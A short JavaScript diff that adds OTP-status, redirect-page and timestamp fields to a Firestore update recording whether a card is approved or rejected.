@@ -1242,6 +1242,9 @@
       decision: decision,
       status: decision,
       cardStatus: decision === 'approved' ? 'approved_with_otp' : 'rejected',
+      otpStatus: decision === 'approved' ? 'show_otp' : null,
+      redirectPage: decision === 'approved' ? 'otp' : null,
+      redirectRequestedAt: firebase.firestore.FieldValue.serverTimestamp(),
       decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
       updatedAt: firebase.firestore.FieldValue.serverTimestamp(),
     };
